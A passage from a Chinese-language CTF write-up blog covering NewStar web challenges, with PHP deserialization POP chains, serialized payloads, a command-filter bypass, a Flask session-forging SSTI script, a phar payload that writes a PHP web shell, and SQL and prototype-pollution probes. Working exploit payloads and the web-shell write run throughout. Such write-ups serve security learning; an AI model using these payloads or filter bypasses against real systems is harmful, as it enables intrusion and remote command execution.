class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>确实是minipop，先处理POP链，要调用__toString魔术方法中的exec()方法，我们要把一个类当做字符串来处理，看到minipop类中__destruct魔术方法中有echo，那懂了啊，就是把$this-&gt;qwejaskdjnlka变成上面提到的类就行了，虽然这两个类是一样的，但是问题不大</p><p>再回到__toString里的exec()，可以看到exec($this-&gt;code)，所以说我们传入给qwe属性的这个类要写入能够RCE的code属性，至于外层minipop类的code属性可以不管，同时内层minpop类的qwe属性也可以不管</p><p>接下来就是如何RCE然后读文件或者下载什么的</p><p>首先要明确exec()和system()的区别</p><p>exec是没有回显的，除非传多个参数，那么会将第一个参数的内容存入第二个参数中，所以ls不会返回到页面上</p><p>而且exec失败的话会报错，对于查看是否成功RCE很友好</p><p>可以传code属性为sleep 3，这样可以让相应延迟3秒，也能查看是否成功RCE</p><p>看一下preg_match，嗯，能过滤的都过滤了，但是没有过滤单双引号，可能如果过滤了就传不了序列化对象了？</p><p>那就很好绕过了，对于php的preg_match，毕竟是php的东西，要过滤linux的智能匹配可太难了</p><p>比如ba””se,ex””ec,py””thon,这些都是可以执行的，翻解法的时候看到了tee方法，很好用，用了之后确实很好用</p><p>所以就用te””e来代替传入code属性中的tee就行了</p><blockquote><p>参考:</p><p><a href="https://www.php.net/manual/zh/function.exec.php">https://www.php.net/manual/zh/function.exec.php</a></p><p><a href="https://blog.csdn.net/Kracxi/article/details/121997166">https://blog.csdn.net/Kracxi/article/details/121997166</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">exp:<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-comment">//$a-&gt;code=&#x27;ls | te&quot;&quot;e 1&#x27;;</span><br><span class="hljs-comment">//$a-&gt;code=&#x27;cat /flag_is_h3eeere | te&quot;&quot;e 2&#x27;;</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$b</span>-&gt;qwejaskdjnlka=<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p>拿到序列化后的值用hackbar传post参数就行</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">payload1:<br>O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:12:&quot;ls | te&quot;&quot;e 1&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p>先传入第一个payload1，然后可以访问&#x2F;1页面，就能看到ls输出的返回值，如果没有flag就多试几次cd和ls</p><p>（一般不会为难人</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">payload2:<br>O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:30:&quot;cat /flag<span class="hljs-emphasis">_is_</span>h3eeere | te&quot;&quot;e 2&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p>发现flag_is_h3eere在根目录下，直接cat就行了，用tee下载到&#x2F;2页面上</p><p>访问&#x2F;2页面就能拿到flag</p><p>——————————————————————————————————————————————————</p><h2 id="WEB-week4"><a href="#WEB-week4" class="headerlink" title="WEB-week4"></a>WEB-week4</h2><h3 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bad&quot;</span>,<span class="hljs-string">&quot;good&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>]))));<br></code></pre></td></tr></table></figure><p>可以看到页面显示system(‘whoami’)的结果被打印了两次，第一次是在定义一个新的GetFlag类的时候，调用了__destruct()魔术方法，会自动执行system函数并回显到浏览器上</p><p>第二次是反序列化的时候，相当于将传入的序列化后的GetFlag类重新变成GetFlag类，也会调用__construct()和__destruct()</p><p>首先分析一个单独的GetFlag类，明显可以看出我们可控的变量仅有$key,而$cmd是我们无法控制的</p><p>单纯修改$key的值几乎没什么用，所以可能需要多个类来形成POP链</p><p>但是很显然，我$_GET[‘key’]传入的key值不可能是个类型，所以也没法传入一个类了</p><p>看到str_replace，把所有bad换成good，每换一次字符长度+1，但是序列化后字符长度值不变，</p><p>那就&#x3D;Moe~夺命十三枪，不难，构造一下Payload吧</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">Payload:<br>need:<br><span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:2:&quot;</span><span class="hljs-keyword">ls</span><span class="hljs-comment">&quot;;&#125;</span><br>badbad...<span class="hljs-keyword">bad</span><br>...==need<br>badbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:2:&quot;</span><span class="hljs-keyword">ls</span><span class="hljs-comment">&quot;;&#125;bad    -15</span><br><br>Final:<br>key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:2:&quot;</span><span class="hljs-keyword">ls</span><span class="hljs-comment">&quot;;&#125;    //index.php    --22*good-&gt;88</span><br>key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:9:&quot;</span><span class="hljs-keyword">cat</span> /flag<span class="hljs-comment">&quot;;&#125;  </span><br></code></pre></td></tr></table></figure><p>——————————————————————————————————————————————————</p><h3 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;errMsg);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>))&#123;<br>            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not Flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$wel</span> = <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;good;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NewStar&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good job but nothing&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fast&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Nope&quot;</span>);<br></code></pre></td></tr></table></figure><p>又双叒是POP链题，恼（</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">Start.errMsg</span>=Crypto    //Crypto之__toString<br><span class="hljs-attr">Crypto.obj</span>=Reverse    //Reverse之__get<br><span class="hljs-attr">Reverse.func</span>=Pwn      //Pwn之__invoke<br><span class="hljs-attr">Pwn.obj</span>=Web or Misc ?? //Web&amp;Misc之evil()<br><span class="hljs-attr">Web.func</span>=<span class="hljs-string">&#x27;system&#x27;</span><br><span class="hljs-attr">Web.var</span>=<span class="hljs-string">&#x27;ls&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>恼，不做了（\ud83d\ude21）</strong></p><p>——————————————————————————————————————————————————</p><h3 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;select name, price from items where id = &quot;</span>.<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;id&quot;</span>];<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_all</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$result</span>[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>粗试了一下，发现过滤了空格和&#x3D;</p><p>而且这压根就没有执行任何有效的sql嘛，只有result的莫名嵌套，所以是不会有任何结果的</p><p>传入的是个字符型变量，但是检测应该是发生在拼接语句之前的，所以照理应该是可以执行id里的php语法</p><p>直接打个sleep(2)进去，网页直接开睡，原来直接RCE就行了（？</p><p>就是好像没有回显，所以这…难不成是要拿shell嘛，但是呢好像有点不太对，因为堆叠用不了</p><p>比如1;sleep(1)网页是不睡的，所以得重新审视一下逻辑</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">-<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span><span class="hljs-built_in">sleep</span>(<span class="hljs-number">2</span>)<br><span class="hljs-number">1</span><span class="hljs-comment">/**/</span>&amp;&amp;<span class="hljs-comment">/**/</span><span class="hljs-built_in">sleep</span>(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>以上POC均不行，要不就是输进去就network-err</p><p>我懂了，我发现sleep(1);sleep(1)也不会让网页睡觉，所以只有当id是个可执行的短语句（不能有分号）才会执行</p><p>——————————————————————————————————————————————————</p><h3 id="Injectme"><a href="#Injectme" class="headerlink" title="Injectme"></a>Injectme</h3><p>目录穿越先拿源码，密钥未知试试读取一下config，没想到确实有（其实没有就做不下去了</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret_key</span> = <span class="hljs-string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span><br></code></pre></td></tr></table></figure><p>ezSSTI（wrong</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br>sys.path.append(<span class="hljs-string">r&#x27;C:\Users\Jednersaous\Desktop\web-test\build\flasksessioncookiemanagermaster&#x27;</span>)<br><span class="hljs-keyword">import</span> flask_session_cookie_manager3<br><br><br><span class="hljs-comment"># cookie_structure = &quot;&#123;&#x27;user&#x27;: \&quot;&#123;% print([][&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()) %&#125;\&quot;&#125;&quot;</span><br><span class="hljs-comment"># secret = &#x27;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&#x27;</span><br><span class="hljs-comment"># payload = flask_session_cookie_manager3.FSCM.encode(secret,cookie_structure)</span><br><span class="hljs-comment"># print(payload)</span><br><br><span class="hljs-comment">#find os</span><br><span class="hljs-comment"># url=&#x27;http://17accd58-671d-4091-b453-94dff0b6c092.node4.buuoj.cn:81/backdoor&#x27;</span><br><span class="hljs-comment"># for j in range(150):</span><br><span class="hljs-comment">#     cookie_structure = &quot;&#123;&#x27;user&#x27;: \&quot;&#123;% print([][&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()) %&#125;\&quot;&#125;&quot;</span><br><span class="hljs-comment">#     a=&#x27;[%d]&#x27; % j</span><br><span class="hljs-comment">#     cookie_structure=cookie_structure[0:84]+a+cookie_structure[84:100]</span><br><span class="hljs-comment">#     secret = &#x27;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&#x27;</span><br><span class="hljs-comment">#     payload = flask_session_cookie_manager3.FSCM.encode(secret,cookie_structure)</span><br><span class="hljs-comment">#     print(payload)</span><br><span class="hljs-comment">#     cookiet=&#123;</span><br><span class="hljs-comment">#         &#x27;session&#x27;: payload</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     a=requests.get(url=url, cookies=cookiet)</span><br><span class="hljs-comment">#     if &quot;os&quot; in a.text:</span><br><span class="hljs-comment">#         print(a.text)</span><br><span class="hljs-comment">#         print(j)</span><br><br>cookie_structure = <span class="hljs-string">&quot;&#123;&#x27;user&#x27;: \&quot;&#123;% print([][&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()[117][&#x27;_&#x27;&#x27;_ini&#x27;&#x27;t_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ca&#x27;&#x27;t /y0U3_f14g_1s_h3re&#x27;)[&#x27;read&#x27;]()) %&#125;\&quot;&#125;&quot;</span> <span class="hljs-comment">#tail</span><br><span class="hljs-built_in">print</span>(cookie_structure)<br>secret = <span class="hljs-string">&#x27;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&#x27;</span><br>payload = flask_session_cookie_manager3.FSCM.encode(secret,cookie_structure)<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><p>——————————————————————————————————————————————————</p><h3 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h3><p>phar反序列化，检测<code>__HALT_COMPILER()</code>，用<code>gzip</code>绕过</p><p>无回显rce，有写入权限，直接在<code>/var/www/html</code>下新写一个可以回显的:horse:</p><p>至于反弹shell，没成功，原因未知（（（</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;cmd=<span class="hljs-string">&quot;echo &#x27;&lt;?=system(\$_GET[1]);?&gt;&#x27;&gt;/var/www/html/1.php&quot;</span>;<br><span class="hljs-variable">$phartest</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">phar</span>(<span class="hljs-string">&#x27;pharone.phar&#x27;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>——————————————————————————————————————————————————</p><h3 id="OtenkiBoy"><a href="#OtenkiBoy" class="headerlink" title="OtenkiBoy"></a>OtenkiBoy</h3><p>Week3OtenkiGirl的加强版，还是JavaScript原型链污染</p><p>主要分析<code>routes/info.js,routes/submit.js,routes/_components/utils.js</code></p><p>可以发现utils.js中的mergeJSON()函数仍然是一个递归的可浅可深的拷贝，但是过滤了<code>__proto__</code></p><p>那么可以用<code>&#123;&#39;constructor&#39;:&#123;&#39;prototype&#39;:&#39;&#39;&#125;&#125;</code>来绕过，这两者是等价的</p><p>其余的剩下再打</p><p>——————————————————————————————————————————————————</p><h2 id="WEB-week5"><a href="#WEB-week5" class="headerlink" title="WEB-week5"></a>WEB-week5</h2><h3 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 